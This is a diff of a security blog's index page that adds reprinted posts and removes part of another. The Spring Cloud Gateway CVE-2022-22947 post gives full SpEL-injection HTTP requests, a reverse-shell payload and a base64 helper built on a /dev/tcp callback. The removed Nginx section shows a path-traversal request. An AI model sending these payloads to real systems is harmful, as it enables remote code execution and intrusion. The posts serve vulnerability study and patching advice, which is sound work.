@@ -82,6 +82,219 @@
 
     
         <h2 class="title">
+            <a href="/2023/10/25/CVE-2022-22947-Spring-Cloud/">
+                Spring Cloud Gateway rce（CVE-2022-22947）
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="spring-cloud-gateway-rcecve-2022-22947">Spring Cloud Gateway rce（CVE-2022-22947）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/123338198">6right</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。<br>也是codeql发现的</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
+<p>3.1.0<br>3.0.0至3.0.6<br>3.0.0之前的版本</p>
+</blockquote>
+<h2><span id="复现漏洞">复现漏洞</span></h2><blockquote>
+<p>首先，发送以下请求以添加包含恶意SpEL 表达式的路由器：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>333</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反弹shell将命令替换为base64命令即可<br>Content-Type: application&#x2F;json</p>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/1.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>其次，刷新网关路由器。SpEL 表达式将在此步骤中执行：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/2.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>第三，发送以下请求以检索结果：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/3.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>查看所有路由</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span> 123.58.236.76:40279</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/4.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>最后，发送一个 DELETE 请求来删除我们的恶意路由器：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/actuator/gateway/routes/lyy9</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.58.236.76:40279</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/5.png" alt="image"><br>删除后用记得也用refresh</p>
+</blockquote>
+<h2><span id="反弹shell">反弹shell</span></h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>333</span><br><span class="line"></span><br><span class="line"><span class="language-livescript">&#123;</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-livescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-livescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="string">\&quot;bash</span> -c &#123;echo,反弹shellbase64&#125;</span>|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;).getInputStream()))&#125;&quot;</span></span></span><br><span class="line"><span class="language-livescript">    &#125;</span></span><br><span class="line"><span class="language-livescript">  &#125;],</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://example.com&quot;</span></span></span><br><span class="line"><span class="language-livescript">&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>删去new String[]初始化，直接将base64的反弹shell命令放入填入<br>生成base64那个站点崩了，可以自己写个python</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64_str = <span class="built_in">input</span>(<span class="string">&quot;请输入反弹shell命令,如：bash -i  &gt;&amp;  /dev/tcp/11.11.11.11/2334 0&gt;&amp;1\n&quot;</span>)</span><br><span class="line">res = base64.b64encode(base64_str.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bash -c &#123;echo,&quot;</span>+res.decode()+<span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
+<p>SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行<br>如果想要深入学习SpEL表达式可以参考<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">Mi1k7ea师傅的文章</a></p>
+</blockquote>
+<blockquote>
+<p>首先定位到漏洞的修复版本对比<br><code>https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e</code><br><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/6.png" alt="image"><br>可以看到删除了默认的StandardEvaluationContext，改用自定义的GatewayEvaluationContext来对表达式进行SpEL进行处理</p>
+<p>默认的StandardEvaluationContext里getValue方法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue)</span> &#123;</span><br><span class="line">	Object value;</span><br><span class="line">	<span class="type">String</span> <span class="variable">rawValue</span> <span class="operator">=</span> entryValue;</span><br><span class="line">	<span class="keyword">if</span> (rawValue != <span class="literal">null</span>) &#123;</span><br><span class="line">		rawValue = rawValue.trim();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (rawValue != <span class="literal">null</span> &amp;&amp; rawValue.startsWith(<span class="string">&quot;#&#123;&quot;</span>) &amp;&amp; entryValue.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">		<span class="comment">// assume it&#x27;s spel</span></span><br><span class="line">		<span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">		context.setBeanResolver(<span class="keyword">new</span> <span class="title class_">BeanFactoryResolver</span>(beanFactory));</span><br><span class="line">		<span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(entryValue, <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>());</span><br><span class="line">		value = expression.getValue(context);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		value = entryValue;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以控制 getValue 方法调用,那么就能调用任何有效的表达式达到注入效果</p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
+<p>3.1.x用户应升级到3.1.1+<br>3.0.x用户应升级到3.0.7+<br>如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用<br>如果需要Actuator端点，则应使用Spring Security对其进行保护</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/Android-Leaks/">
+                android使用Leaks检测内存泄漏
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="android使用leaks检测内存泄漏">android使用Leaks检测内存泄漏</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/fancy_xty/article/details/51595313">浅浅清风</a> 并作补充</p>
+</blockquote>
+<h2><span id="leaks-内存泄漏检测工具使用">Leaks 内存泄漏检测工具使用</span></h2><blockquote>
+<p>网址:<a target="_blank" rel="noopener" href="https://github.com/square/leakcanary">https://github.com/square/leakcanary</a><br>在你的module中添加依赖</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android:1.4-beta2&#x27;</span></span><br><span class="line">releaseCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android-no-op:1.4-beta2&#x27;</span></span><br><span class="line">testCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android-no-op:1.4-beta2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在Application中添加: <code>LeakCanary.install(this);</code></p>
+</blockquote>
+<blockquote>
+<p>并且确保你的app处于调试模式，如下图:</p>
+<p><img src="/2023/10/25/Android-Leaks/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>当切换到release版本的时候,leakcanary-debug不会被打包.所以切换到release之后不用对leakcanary做注释或者删除等操作.<br>现在就可以开始使用了,重新编译你的工程,运行在模拟器或真机上.<br>在各个页面中测试,如果存在内存泄漏的情况,leaks会弹出通知提醒你查看.<br>在leaks中会有详细的泄漏说明，如产生内存泄漏的大小，产生内存泄漏的页面和相关的信息。</p>
+<p><img src="/2023/10/25/Android-Leaks/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>内存泄漏详情：</p>
+<p><img src="/2023/10/25/Android-Leaks/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>最后有一些关于内存泄漏的建议:<br>为了避免上下文相关的内存泄漏,记住以下几点:<br>不要长期引用context-activity(引用一个活动应该有相同的生命周期活动本身)<br>使用getApplicationContext而不是context或activity试试<br>避免非静态内部类的一个活动如果你不控制自己的生命周期,使用静态内部类,让一个弱引用来传递,并且记住,垃圾收集器对于内存泄漏并不保险。</p>
+</blockquote>
+<blockquote>
+<p>下面说几个作者遇到的内存泄漏的情况以及解决方案:<br>使用百度地图LocationClient.在Activity被销毁时调用</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mLocClient != <span class="literal">null</span>)&#123;</span><br><span class="line">            mLocClient.unRegisterLocationListener(myListener);</span><br><span class="line">            mLocClient.stop();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用友盟分享登录时, 传递getApplicationContext<br>第三方库如果需要传入Activity的时候，传递一个弱引用进去， 可以避免内存泄漏,如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reference&lt;HomeActivity&gt; reference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>(getActivity());</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ShareAction</span>(reference.get()).setDisplayList(displaylist);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在Handler中容易造成内存泄漏，最好使用弱引用方式，要么，在Activity销毁的时候清空所有的handler栈。</p>
+<p>在使用WebView的时候也可能出现内存泄漏，解决办法，我的<a target="_blank" rel="noopener" href="http://blog.csdn.net/fancy_xty/article/details/51595697">另一篇博客</a>里有详细讲解。</p>
+<p>在使用RxJava的时候也可能会出现内存泄漏，可以使用RxLifecycler来解决。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Leaks/" rel="tag">Leaks</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/MPS-2022-60494-YApi/">
+                YApi命令执行漏洞（MPS-2022-60494）安全风险通告
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="yapi命令执行漏洞mps-2022-60494安全风险通告">YApi命令执行漏洞（MPS-2022-60494）安全风险通告</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.secrss.com/articles/48900">奇安信 CERT</a> 并作补充</p>
+</blockquote>
+<h2><span id="项目介绍">项目介绍</span></h2><blockquote>
+<p>YApi 是高效、易用、功能强大的 API管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护API。<br>近日，奇安信CERT监测到YApi命令执行漏洞，远程未授权的攻击者可通过注入漏洞获取有效用户token，进而利用自动化测试接口绕过沙箱限制，最终在目标系统上执行任意命令。鉴于该漏洞影响范围较大，建议客户尽快做好自查及防护。</p>
+</blockquote>
+<h2><span id="漏洞概述">漏洞概述</span></h2><blockquote>
+<p>YApi中存在命令执行漏洞，远程未授权的攻击者可通过注入漏洞获取有效用户token，进而利用自动化测试接口绕过沙箱限制，最终在目标系统上执行任意命令。</p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>YApi &lt; 1.12.0</p>
+</blockquote>
+<h2><span id="修复方式">修复方式</span></h2><h3><span id="一-版本升级">一、版本升级</span></h3><blockquote>
+<p>目前官方已有<a target="_blank" rel="noopener" href="https://github.com/YMFE/yapi/releases/tag/v1.12.0">可更新版本</a>，建议受影响用户更新至 1.12.0 及以上版本。<br>注：</p>
+<ol>
+<li>YApi 1.11.0版本已修复Mongo注入获取Token的问题，导致攻击者无法在未授权的情况下利用此漏洞。</li>
+<li>在YApi 1.12.0的版本更新中，仅默认禁用了Pre-request和Pre-response脚本功能，使得此漏洞在默认配置下无法利用。</li>
+</ol>
+</blockquote>
+<h3><span id="二-缓解措施">二、缓解措施</span></h3><blockquote>
+<ol>
+<li>在业务允许的情况下，建议将YApi部署在内网，禁止外网访问。</li>
+<li>修改默认token加密的盐:<br>编辑项目根目录中的config.json，添加”passsalt”:”任意随机值”，如:<br><code>&quot;passsalt&quot;:&quot;this_is_a_test&quot;</code><br>保存，重启YApi服务即可。</li>
+</ol>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c?diff=split">https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c?diff=split</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/YApi/" rel="tag">YApi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/">
                 CVE-2022-31692 Spring Security Oauth2 Client权限提升漏洞
             </a>
@@ -618,195 +831,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Github/" rel="tag">Github</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/Nginx-Alias/">
-                Nginx错误配置alias导致目录遍历漏洞
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="nginx错误配置alias导致目录遍历漏洞">Nginx错误配置alias导致目录遍历漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/">BlackWolf</a> 并作补充</p>
-</blockquote>
-<h2><span id="0x00-前言">0x00 前言</span></h2><blockquote>
-<p>nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。</p>
-</blockquote>
-<h2><span id="0x01-环境搭建">0x01 环境搭建</span></h2><blockquote>
-<p>使用richarvey&#x2F;nginx-php-fpm镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80  richarvey/nginx-php-fpm</span><br></pre></td></tr></table></figure>
-
-<p>配置nginx，添加配置test路由解析到&#x2F;var&#x2F;www&#x2F;html&#x2F;路径（注意：&#x2F;test没有结尾的&#x2F;）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /etc/nginx/sites-available/default.conf</span><br><span class="line">location /test &#123;</span><br><span class="line">        alias /var/www/html/;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|--var</span><br><span class="line">   |--www</span><br><span class="line">      |--flag.txt</span><br><span class="line">      |--html</span><br><span class="line">         |--index.php</span><br><span class="line">         |--test.txt</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="0x02-漏洞利用">0x02 漏洞利用</span></h2><blockquote>
-<p>通过访问<a target="_blank" rel="noopener" href="http://127.0.0.1/test/test.txt">http://127.0.0.1/test/test.txt</a></p>
-<p>可以成功访问到test的内容如下(&#x2F;test&#x2F;test.txt路由请求，经处理后转换成：&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt)：</p>
-<p><code>this is a test</code></p>
-<p>修改请求为<a target="_blank" rel="noopener" href="http://127.0.0.1/test../flag.txt%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%B7%B3%E5%88%B0%E4%B8%8A%E4%B8%80%E5%B1%82%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%88%B0flag.txt%E7%9A%84%E5%86%85%E5%AE%B9(%60/test../flag.txt%60%E8%B7%AF%E7%94%B1%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%BB%8F%E5%A4%84%E7%90%86%E5%90%8E%E8%BD%AC%E6%8D%A2%E6%88%90%EF%BC%9A%60/var/www/flag.txt%60)">http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)</a></p>
-<p><code>you get me, hahaha</code></p>
-</blockquote>
-<h2><span id="0x03-小结">0x03 小结</span></h2><blockquote>
